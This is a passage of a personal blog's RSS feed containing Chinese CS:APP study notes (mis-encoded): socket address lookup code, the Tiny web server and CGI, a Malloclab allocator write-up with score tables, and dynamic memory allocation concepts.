 ä¼˜ç‚¹:åŒæ—¶é€‚ç”¨äºIPv4å’ŒIPv6;å¯é‡å…¥(èƒ½å®‰å…¨ç”¨äºå¤šçº¿ç¨‹ç¨‹åº)&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int getaddrinfo(const char *host, /* Hostname or address */ 
                const char *service, /* Port or service name */ 
                const struct addrinfo *hints,/* Input parameters */ 
                struct addrinfo **result); /* Output linked list */ 
                
void freeaddrinfo(struct addrinfo *result); /* Free linked list */ 
const char *gai_strerror(int errcode); /* Return error msg */
&lt;/code&gt;&lt;/pre&gt;
 &lt;code&gt;getaddrinfo&lt;/code&gt;å‡½æ•°è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªé“¾è¡¨:
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250210213057.png&quot; alt=&quot;&quot;&gt;
 åŒ…å«ä¸»æœºçš„è§„èŒƒå,IPåœ°å€ç­‰ä¿¡æ¯.
 å¯¹äºå®¢æˆ·ç«¯,éå†è¿™ä¸ªé“¾è¡¨ç›´åˆ°socketè°ƒç”¨&lt;code&gt;connect&lt;/code&gt;æˆåŠŸ;
 å¯¹äºæœåŠ¡ç«¯,éå†è¿™ä¸ªé“¾è¡¨ç›´åˆ°socketè°ƒç”¨&lt;code&gt;bind&lt;/code&gt;æˆåŠŸ.
 é“¾è¡¨çš„æ¯ä¸ªèŠ‚ç‚¹æ˜¯ä¸€ä¸ª&lt;code&gt;addinfo struct&lt;/code&gt;ç»“æ„ä½“:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct addrinfo { 
    int ai_flags; /* Hints argument flags */ 
    int ai_family; /* First arg to socket function */ 
    int ai_socktype; /* Second arg to socket function */ 
    int ai_protocol; /* Third arg to socket function */ 
    char *ai_canonname; /* Canonical host name */ 
    size_t ai_addrlen; /* Size of ai_addr struct */ 
    struct sockaddr *ai_addr; /* Ptr to socket address structure */ 
    struct addrinfo *ai_next; /* Ptr to next item in linked list */ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ç”¨ä¾‹&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;å®¢æˆ·ç«¯è·å–æœåŠ¡å™¨å¯è¿æ¥çš„IPåœ°å€&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int open_clientfd(char *hostname, char *port) { 
    int clientfd; 
    struct addrinfo hints, *listp, *p; /* Get a list of potential server addresses */ 
    memset(&amp;amp;hints, 0, sizeof(struct addrinfo)); 
    hints.ai_socktype = SOCK_STREAM; /* Open a connection */ 
    hints.ai_flags = AI_NUMERICSERV; /* â€¦using numeric port arg. */ 
    hints.ai_flags |= AI_ADDRCONFIG; /* Recommended for connections */ 
    Getaddrinfo(hostname, port, &amp;amp;hints, &amp;amp;listp);
    /* Walk the list for one that we can successfully connect to */ 
    for (p = listp; p; p = p-&amp;gt;ai_next) { 
        /* Create a socket descriptor */ 
        if ((clientfd = socket(p-&amp;gt;ai_family, p-&amp;gt;ai_socktype, p-&amp;gt;ai_protocol)) &amp;lt; 0) 
            continue; /* Socket failed, try the next */ 
            
        /* Connect to the server */ 
        if (connect(clientfd, p-&amp;gt;ai_addr, p-&amp;gt;ai_addrlen) != -1) 
            break; /* Success */ 
        Close(clientfd); /* Connect failed, try another */ 
    } 
    
    /* Clean up */ 
    Freeaddrinfo(listp); 
    if (!p) /* All connects failed */ 
        return -1; 
    else /* The last connect succeeded */ 
        return clientfd; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;æœåŠ¡å™¨åˆ›å»ºç›‘å¬å¥—æ¥å­—&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int open_listenfd(char *port) { 
    struct addrinfo hints, *listp, *p; 
    int listenfd, optval=1; /* Get a list of potential server addresses */ 
    memset(&amp;amp;hints, 0, sizeof(struct addrinfo)); 
    hints.ai_socktype = SOCK_STREAM; /* Accept connect. */ 
    hints.ai_flags = AI_PASSIVE | AI_ADDRCONFIG; /* â€¦on any IP addr */ 
    hints.ai_flags |= AI_NUMERICSERV; /* â€¦using port no. */ 
    Getaddrinfo(NULL, port, &amp;amp;hints, &amp;amp;listp);
    
    /* Walk the list for one that we can bind to */ 
    for (p = listp; p; p = p-&amp;gt;ai_next) { 
        /* Create a socket descriptor */ 
        if ((listenfd = socket(p-&amp;gt;ai_family, p-&amp;gt;ai_socktype, p-&amp;gt;ai_protocol)) &amp;lt; 0) 
            continue; /* Socket failed, try the next */ 
        
        /* Eliminates &amp;quot;Address already in use&amp;quot; error from bind */ 
        Setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;amp;optval , sizeof(int)); 
        
        /* Bind the descriptor to the address */ 
        if (bind(listenfd, p-&amp;gt;ai_addr, p-&amp;gt;ai_addrlen) == 0) 
            break; /* Success */ 
        Close(listenfd); /* Bind failed, try the next */ 
    }
    /* Clean up */ 
    Freeaddrinfo(listp); 
    if (!p) /* No address worked */ 
        return -1; 
        
    /* Make it a listening socket ready to accept conn. requests */ 
    if (listen(listenfd, LISTENQ) &amp;lt; 0) { 
        Close(listenfd); 
        return -1; 
    } 
    return listenfd; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;getnameinfo&lt;/code&gt;å‡½æ•°:æ ¹æ®IPåœ°å€æŸ¥è¯¢åŸŸå&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int getnameinfo(const struct sockaddr *sa, 
				socklen_t salen, /* In: socket addr */ 
				char *host, size_t hostlen, /* Out: host */ 
				char *serv, size_t servlen, /* Out: service */ 
				int flags);                 /* optional flags */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸&lt;code&gt;getaddrinfo&lt;/code&gt;ç±»ä¼¼.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;WebæœåŠ¡å™¨&lt;/h1&gt;
&lt;p&gt;æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯äº¤æµä½¿ç”¨çš„åº”ç”¨å±‚åè®®æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®(HTTP).å½“å‰æ˜¯ç‰ˆæœ¬HTTP/1.1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;åŠ¨æ€å’Œé™æ€å†…å®¹
  é™æ€å†…å®¹:HTML,å›¾ç‰‡
  åŠ¨æ€å†…å®¹:æ ¹æ®å®¢æˆ·ç«¯çš„è¡Œä¸º,æœ‰æœåŠ¡å™¨æ‰§è¡Œç¨‹åºäº§ç”Ÿ.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;HTTPè¯·æ±‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;method&amp;gt; &amp;lt;uri&amp;gt; &amp;lt;version&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  &lt;code&gt;&amp;lt;method&amp;gt;&lt;/code&gt;å¯ä»¥æ˜¯GET,POST,OPTIONS,HEAD,PUT,DELETE,TRACE
  &lt;code&gt;&amp;lt;uri&amp;gt;&lt;/code&gt;æ˜¯ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦
  &lt;code&gt;&amp;lt;version&amp;gt;&lt;/code&gt;æ˜¯HTTPç‰ˆæœ¬(HTTP/1.0æˆ–HTTP/1.1)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;TinyæœåŠ¡å™¨&lt;/h2&gt;
&lt;p&gt;TinyæœåŠ¡å™¨æ˜¯æœ¬è¯¾ç¨‹æä¾›çš„ä¸€ä¸ªWebæœåŠ¡å™¨ç¤ºä¾‹,åªæœ‰200å¤šè¡ŒCè¯­è¨€ä»£ç .å¯ä»¥è¯·æ±‚é™æ€å’ŒåŠ¨æ€å†…å®¹.
è¯·æ±‚æ–¹å¼æ˜¯:
&lt;code&gt;GET &amp;lt;URI&amp;gt; &amp;lt;version&amp;gt;&lt;/code&gt;
åŠ¨æ€å†…å®¹åœ¨&lt;code&gt;/cgi-bin/&lt;/code&gt;ä¸‹
	&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250211110110.png&quot; alt=&quot;&quot;&gt;
   &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250211110132.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå­è¿›ç¨‹é€šè¿‡é€šç”¨ç½‘å…³æ¥å£(CGI:Common Gateway Interface)å®ç°.
ç›®å‰, cgi-biné‡Œé¢æœ‰ä¸€ä¸ªç¨‹åºadder,é€šè¿‡è®¾ç½®URIä¸º
/cgi-bin/adder?15213&amp;amp;18213
å°†å‚æ•°ä¼ ç»™ç¨‹åº.
å˜é‡ä»&amp;quot;?&amp;quot;èµ·å§‹,ç”¨&amp;quot;&amp;amp;&amp;quot;åˆ†éš”.å¦‚æœç”¨ç©ºæ ¼,ç”¨&amp;quot;+&amp;quot;æˆ–&amp;quot;%20&amp;quot;.
CGIç¨‹åºç›´æ¥å°†è¾“å‡ºé‡å®šå‘åˆ°å®¢æˆ·ç«¯çš„å¥—æ¥å­—.&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Sun, 09 Feb 2025 16:00:00 GMT</pubDate></item><item><title>Malloclab</title><link>https://www.tankimzeg.top/blog/malloclab/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/malloclab/</guid><description>Malloclab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/malloclab/&quot;&gt;https://www.tankimzeg.top/blog/malloclab/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;å‡†å¤‡å·¥ä½œ&lt;/h1&gt;
&lt;p&gt;ä¸ºæ–¹ä¾¿GDBè°ƒè¯•,ä¿®æ”¹Makefile:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cmake&quot;&gt;CC = gcc -g
CFLAGS = -Wall -O0 -m32
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å€¼å¾—æ³¨æ„çš„æ˜¯,è¿™é‡Œçš„ &lt;code&gt;-m32&lt;/code&gt;æ ‡ç­¾å¼ºåˆ¶ä½¿ç”¨32ä½ç¼–è¯‘,ä¹Ÿå°±æ˜¯è¯´,ç›¸å½“äº32ä½ç³»ç»Ÿ,æŒ‡é’ˆå¤§å°æ˜¯4å­—èŠ‚!ä¸€å¼€å§‹æ²¡æ³¨æ„,å¯¼è‡´äº†å¾ˆå¤šå›°æƒ‘.&lt;/p&gt;
&lt;p&gt;ä¸‹è½½12ä¸ªtracesæ–‡ä»¶,ä¿®æ”¹config.h:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;//#defineÂ TRACEDIRÂ &amp;quot;/afs/cs/project/ics2/im/labs/malloclab/traces/&amp;quot;  
#defineÂ TRACEDIRÂ &amp;quot;./traces/&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ¬æ¬¡å®éªŒå¯ä»¥2ä¸ªäººåˆä½œ(è¯è¯´ä¸¤ä¸ªäººæ€ä¹ˆå†™ä¸€ä»½ä»£ç å•Š?è®¾è®¡ä¸åŒæ€ä¹ˆå…¼å®¹,ä¸€èµ·æ‰¾bugè¿˜å¯è¡Œç‚¹).&lt;/p&gt;
&lt;p&gt;éœ€è¦æˆ‘å†™4ä¸ªå‡½æ•°,å®ç°å †ç®¡ç†:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mm_init&lt;/code&gt;:å †åˆå§‹åŒ–&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mm_malloc&lt;/code&gt;:è‡ªå·±å®ç°&lt;code&gt;malloc&lt;/code&gt;å‡½æ•°çš„åŠŸèƒ½&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mm_free&lt;/code&gt;:è‡ªå·±å®ç°&lt;code&gt;free&lt;/code&gt;å‡½æ•°çš„åŠŸèƒ½&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mm_realloc&lt;/code&gt;:è‡ªå·±å®ç°&lt;code&gt;realloc&lt;/code&gt;å‡½æ•°çš„åŠŸèƒ½
é™¤æ­¤ä¹‹å¤–,è¿˜æœ‰5åˆ†è½åœ¨äº†å †ä¸€è‡´æ€§æ£€æŸ¥å™¨ä¸Š:&lt;/li&gt;
&lt;li&gt;freeåˆ—è¡¨é‡Œçš„å—éƒ½æ ‡è®°ä¸ºfree&lt;/li&gt;
&lt;li&gt;æ²¡æœ‰è¿ç»­çš„freeå—&lt;/li&gt;
&lt;li&gt;freeå—éƒ½åœ¨freeé‡Œ
ç­‰ç­‰.æˆ‘ä¸»è¦ç”¨çš„ç¬¬ä¸€ä¸ªåŠŸèƒ½.æ‰¾bugçš„æ—¶å€™è‡ªå·±æ£€æŸ¥,è¿™ç¡®å®æ˜¯ä¸ªå¥½å»ºè®®,ç¨å¾®æœ‰ç‚¹å¸®åŠ©.å› ä¸º./mdriveç»™çš„é”™è¯¯ä¿¡æ¯å®åœ¨å¤ªå°‘äº†...&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;ä»£ç è§£é‡Š&lt;/h1&gt;
&lt;p&gt;æˆ‘ä½¿ç”¨çš„ç­–ç•¥æ˜¯éš”ç¦»ç©ºé—²å—åˆ—è¡¨ + first fit + å¤´æ’æ³•.
åœ¨config.hæ–‡ä»¶ä¸­æŒ‡æ˜äº†æœ€å¤§å †ç©ºé—´:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#defineÂ MAX_HEAPÂ (20*(1&amp;lt;&amp;lt;20))Â Â /*Â 20Â MBÂ */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥æ ¹æ®2çš„å¹‚å¯ä»¥ç¡®å®šseglistçš„å…ƒç´ ä¸ªæ•°.&lt;/p&gt;
&lt;p&gt;å†™ä»£ç çš„è¿‡ç¨‹ä¾æ—§éš¾ä»¥è¨€è¯´,ä¸bugè¿›è¡Œå„ç§åšå¼ˆ...ç¿»æ¥è¦†å»èƒ½æ”¹å¥½å‡ é.å…·ä½“è§ä»£ç çš„æ³¨é‡Š,éƒ½æ˜¯å†™ä»£ç è¿‡ç¨‹ä¸­æ‰€æ€æ‰€æƒ³,å¾ˆä»”ç»†äº†.&lt;/p&gt;
&lt;p&gt;mm_reallocå‡½æ•°ä¸»ä½“å¾ˆé•¿,æ¨¡å—åŒ–è¾ƒå·®,å› ä¸ºæƒ…å†µå®åœ¨å¤ªå¤šäº†,ä¸æ˜¯å¾ˆæ»¡æ„...&lt;/p&gt;
&lt;p&gt;æœ‰ä¸€ä¸ªå¾ˆå‘çš„ç‚¹,å½“ &lt;code&gt;memcpy&lt;/code&gt;çš„å†…å­˜åŒºåŸŸé‡å æ—¶å°±ä¸è¦ä½¿ç”¨äº†ä¼šæœ‰å¥‡æ€ªçš„bug(å¡«å……åˆ«çš„å­—ç¬¦),æ”¹ç”¨åŠŸèƒ½ä¸€æ ·çš„&lt;code&gt;memmove&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;reallocæ”¹è¿›å‰:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Results for mm malloc:
trace  valid  util     ops      secs  Kops
 0       yes   98%    5694  0.000421 13512
 1       yes   98%    5848  0.000426 13721
 2       yes   97%    6648  0.000456 14576
 3       yes   99%    5380  0.000370 14525
 4       yes  100%   14400  0.000661 21795
 5       yes   92%    4800  0.000455 10561
 6       yes   90%    4800  0.000379 12672
 7       yes   55%   12000  0.000590 20353
 8       yes   51%   24000  0.001004 23892
 9       yes   58%   14401  0.001003 14358
10       yes   45%   14401  0.000662 21754
Total          80%  112372  0.006427 17484

Perf index = 48 (util) + 40 (thru) = 88/100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;reallocçš„åˆ©ç”¨ç‡ä¸ç†æƒ³,æˆ‘æƒ³äº†ä¸€ä¸‹,ç»“åˆåˆ«äººçš„æ–¹æ³•çš„ç‚¹æ‹¨[^1],æˆ‘ä¸€ä¸‹å­å°±å‘ç°äº†åŸå› .&lt;/p&gt;
&lt;p&gt;åŸå§‹çš„splitå‡½æ•°æ€»æ˜¯åˆ†å‰²å‰éƒ¨,åéƒ¨ç©ºé—².è¿™ä¼šå¯¼è‡´åéƒ¨è¢«åˆ«çš„å ç”¨,reallocæ‰©å¤§å°±åªèƒ½å¦å¯»&lt;/p&gt;
&lt;p&gt;å¦‚æœå¤§å—çš„ä½¿ç”¨åéƒ¨,å°å—çš„ä½¿ç”¨å‰éƒ¨,å°±å¯ä»¥å¤§å¤§æå‡åˆ©ç”¨ç‡!&lt;/p&gt;
&lt;p&gt;è¿™ç§æƒ³æ³•å½“ç„¶æ˜¯å¯¹çš„,è¦åº”ç”¨å¾—å¥½è¿˜éœ€è¦è€ƒè™‘å¾ˆå¤šç»†èŠ‚.&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘ä»…æ˜¯å°†reallocé‡Œé¢çš„splitå…¨éƒ¨æ”¹ç”¨split_post,æ²¡æœ‰åŒºåˆ«å¯¹å¾…å¤§å°,åˆ©ç”¨ç‡å·²ç»æœ‰äº†å¾ˆå¤§æå‡!&lt;/p&gt;
&lt;p&gt;[^1]:&lt;a href=&quot;https://zhuanlan.zhihu.com/p/374478609&quot;&gt;é«˜æ€§èƒ½ Malloc Lab â€”â€” ä¸ä¸Šæ ‘ 97/100&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;ç»“æœ&lt;/h1&gt;
&lt;p&gt;é‡‡ç”¨split_postæ”¹è¿›å:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make &amp;amp;&amp;amp; ./mdriver -a -v
make: &amp;#39;mdriver&amp;#39; is up to date.
Using default tracefiles in ./traces/
Measuring performance with gettimeofday().

Results for mm malloc:
trace  valid  util     ops      secs  Kops
 0       yes   98%    5694  0.000314 18151
 1       yes   98%    5848  0.000405 14429
 2       yes   97%    6648  0.000449 14823
 3       yes   99%    5380  0.000358 15028
 4       yes  100%   14400  0.000595 24218
 5       yes   92%    4800  0.000427 11254
 6       yes   90%    4800  0.000391 12279
 7       yes   55%   12000  0.000567 21160
 8       yes   51%   24000  0.000929 25826
 9       yes   94%   14401  0.025577   563
10       yes  100%   14401  0.000833 17284
Total          89%  112372  0.030844  3643

Perf index = 53 (util) + 40 (thru) = 93/100
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;æ€»ç»“/ä¼˜åŒ–æ–¹å‘&lt;/h1&gt;
&lt;p&gt;éš”ç¦»ç©ºé—²å—åˆ—è¡¨ + first fit + å¤´æ’æ³•è¾¾åˆ°äº†93åˆ†,è¿˜ç®—å¯ä»¥å§,æ¯”ç½‘ä¸Šä¸€äº›å…«åå‡ åˆ†çš„å¼ºå¤šäº†.æ¨¡å—ä¹‹é—´åµŒåˆå¾—å¤ªç´§äº†,å†ä¼˜åŒ–éœ€è¦åŠ¨å¾ˆå¤šç»“æ„,æš‚æ—¶å°±ä¸æŠ˜è…¾äº†.&lt;/p&gt;
&lt;p&gt;ååé‡æ»¡åˆ†å°±æ˜¯40,å¾ˆå®¹æ˜“å¾—æ»¡åˆ†,æé«˜åˆ©ç”¨ç‡æ‰æ˜¯å…³é”®.ä¼˜åŒ–æ–¹å‘å¯ä»¥æ˜¯:å¤´æ’æ³•-&amp;gt;æŒ‰åœ°å€æ’åº;first fit -&amp;gt; best fit.ç”šè‡³ä¸€äº›è¯¾ä¸Šä¸è®²çš„ç®—æ³•,ä»€ä¹ˆäºŒå‰æœç´¢æ ‘å¯èƒ½ä¹Ÿèƒ½ç”¨ä¸Š...&lt;/p&gt;
&lt;p&gt;æœ¬æ¬¡çš„ä»£ç é‡æ¯”è¾ƒå¤§,çº¦500è¡Œ,æ¯”ä¸Šä¸€æ¬¡çš„Cachelabè¿˜å¤§,æˆ‘è‡ªå·±å†™çš„é‚£ä¸ªç½‘ç»œåº”ç”¨æ›´æ˜¯å°å¡æ‹‰ç±³hhh.&lt;/p&gt;
&lt;p&gt;æ€»å…±å†™äº†ä¸¤å¤©åŠçš„æ—¶é—´,ä¹ŸèŠ±äº†ä¸å°‘æ—¶é—´ç”¨GDBè°ƒè¯•,å¸Œæœ›å¯¹è‡ªå·±çš„ä»£ç èƒ½åŠ›æœ‰æ¯”è¾ƒå¥½çš„æå‡å§!&lt;/p&gt;
&lt;h1&gt;æºä»£ç &lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;è§&lt;a href=&quot;https://github.com/PrekrasnoyeDalekov/CS-APP/blob/main/labs/malloclab/mm.c&quot;&gt;mm.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Fri, 07 Feb 2025 16:00:00 GMT</pubDate></item><item><title>åŠ¨æ€å†…å­˜åˆ†é…(åŸºæœ¬æ¦‚å¿µ)</title><link>https://www.tankimzeg.top/blog/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/&quot;&gt;https://www.tankimzeg.top/blog/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;åŸºæœ¬æ¦‚å¿µ&lt;/h1&gt;
&lt;p&gt;ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…åœ¨è¿è¡Œæ—¶è¯·æ±‚è™šæ‹Ÿå†…å­˜.ç”¨äºåœ¨è¿è¡Œæ—¶æ‰ç¡®å®šå¤§å°çš„æ•°æ®ç»“æ„.
åŠ¨æ€å†…å­˜åˆ†é…ç®¡ç†è™šæ‹Ÿå†…å­˜ä¸­çš„&lt;strong&gt;å †&lt;/strong&gt;.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207115740.png&quot; alt=&quot;&quot;&gt;
åˆ†é…å™¨å°†å †ç»´æŠ¤ä¸ºè¿ç»­çš„å˜å¤§å°çš„å—çš„é›†åˆ,å—èƒ½è¢«åˆ†é…æˆ–é‡Šæ”¾.
åˆ†é…å™¨çš„ç±»å‹:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ˜¾å¼åˆ†é…å™¨:æ˜¾å¼åˆ†é…,æ˜¾å¼é‡Šæ”¾
  ä¾‹å¦‚Cè¯­è¨€çš„&lt;code&gt;malloc&lt;/code&gt;å’Œ&lt;code&gt;free&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;éšå¼åˆ†é…å™¨:æ˜¾å¼åˆ†é…,ç³»ç»Ÿéšå¼é‡Šæ”¾
  ä¾‹å¦‚JAVA,pythonçš„åƒåœ¾å›æ”¶æœºåˆ¶&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;åŠ¨æ€å†…å­˜åˆ†é…å‡½æ•°åŒ…&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;malloc&lt;/code&gt;, &lt;code&gt;free&lt;/code&gt;, &lt;code&gt;calloc&lt;/code&gt;, &lt;code&gt;realloc&lt;/code&gt;, &lt;code&gt;sbrk&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;void *malloc(size_t size)&lt;/code&gt;:
  æˆåŠŸ:è¿”å›æŒ‡å‘è‡³å°‘sizeå­—èŠ‚(x86-64ä¸º16å­—èŠ‚è¾¹ç•Œå¯¹é½)çš„å—çš„æŒ‡é’ˆ;å¦‚æœsize=0,è¿”å›NULL
  å¤±è´¥è¿”å›ç©ºæŒ‡é’ˆå¹¶è®¾ç½®errno.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;void free(void *p)&lt;/code&gt;:
  på¿…é¡»æ˜¯ä¹‹å‰åŠ¨æ€å†…å­˜åˆ†é…çš„æŒ‡é’ˆ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;calloc&lt;/code&gt;:	åˆå§‹åŒ–ä¸º0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;realloc&lt;/code&gt;:æ”¹å˜ä¹‹å‰åˆ†é…çš„å—çš„å¤§å°&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sbrk&lt;/code&gt;: åœ¨åˆ†é…å™¨å†…éƒ¨ç”¨äºå¢é•¿æˆ–ç¼©å°å †&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;çº¦æŸ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ç¨‹åº&lt;ul&gt;
&lt;li&gt;ä»»æ„ä½¿ç”¨åˆ†é…/é‡Šæ”¾å‡½æ•°&lt;/li&gt;
&lt;li&gt;é‡Šæ”¾çš„å¿…é¡»æ˜¯åŠ¨æ€åˆ†é…çš„æŒ‡é’ˆ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;åˆ†é…å™¨&lt;ul&gt;
&lt;li&gt;ä¸èƒ½æ§åˆ¶åˆ†é…çš„å—çš„å¤§å°&lt;/li&gt;
&lt;li&gt;è¯·æ±‚åˆ†é…å¿…é¡»ç«‹å³å“åº”,ä¸èƒ½ç§¯æ”’&lt;/li&gt;
&lt;li&gt;åªèƒ½ä»ç©ºä½™ç©ºé—´åˆ†é…&lt;/li&gt;
&lt;li&gt;æ»¡è¶³å¯¹é½åŸåˆ™&lt;/li&gt;
&lt;li&gt;ä¸èƒ½ç§»åŠ¨åˆ†é…çš„å—&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æ€§èƒ½ç›®æ ‡&lt;/h2&gt;
&lt;p&gt;ç”±äºåˆ†é…å™¨æœ‰è¯¸å¤šé™åˆ¶å’Œçº¦æŸ,è¯„ä¼°å®ƒçš„æ€§èƒ½å°±å¾ˆé‡è¦.
å¯¹äºç»™å®šçš„ä¸€ç³»åˆ—&lt;code&gt;malloc&lt;/code&gt;å’Œ&lt;code&gt;free&lt;/code&gt;è¯·æ±‚:
	$R_{0},R_{1},\dots,R_{k},\dots,R_{n-1}$&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ååé‡
 æé«˜å•ä½æ—¶é—´å¤„ç†åˆ†é…é‡Šæ”¾è¯·æ±‚çš„æ¬¡æ•°&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å³°å€¼å†…å­˜åˆ©ç”¨ç‡&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å®šä¹‰:æœ‰æ•ˆè½½è·$P_{k}$&lt;ul&gt;
&lt;li&gt;&lt;code&gt;malloc(p)&lt;/code&gt;å¯¼è‡´æœ‰æ•ˆè½½è·på­—èŠ‚&lt;/li&gt;
&lt;li&gt;$R_{k}$è¯·æ±‚å,æœ‰æ•ˆè½½è·$P_{k}=\sum p_{i}$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å®šä¹‰:å½“å‰å †å¤§å°$H_{k}$&lt;ul&gt;
&lt;li&gt;å‡è®¾å †ä¸å‡å°&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å®šä¹‰:å³°å€¼å†…å­˜åˆ©ç”¨ç‡&lt;ul&gt;
&lt;li&gt;$U_{k}=\frac{max_{i\leq k}P_{i}}{H_{k}}$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; åˆ†é…å™¨çš„ç›®æ ‡å°±æ˜¯åœ¨æ•´ä¸ªè¯·æ±‚åºåˆ—ä¸­ä½¿$U_{n-1}$æœ€å¤§åŒ–.
 å®Œç¾çš„å†…å­˜åˆ©ç”¨ç‡æ˜¯1.ä½†å®é™…ä¸Šç”±äºå¯¹é½åŸåˆ™,ä¸å¯é¿å…åœ°äº§ç”Ÿ&lt;strong&gt;ç¢ç‰‡&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;ç¢ç‰‡(Fragmentation)&lt;/h2&gt;
&lt;p&gt;ä½å†…å­˜åˆ©ç”¨ç‡æ˜¯ç”±ç¢ç‰‡å¯¼è‡´çš„.
æœ‰ä¸¤ç§ç¢ç‰‡ç±»å‹:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å†…éƒ¨ç¢ç‰‡&lt;/li&gt;
&lt;li&gt;å¤–éƒ¨ç¢ç‰‡&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;å†…éƒ¨ç¢ç‰‡&lt;/h3&gt;
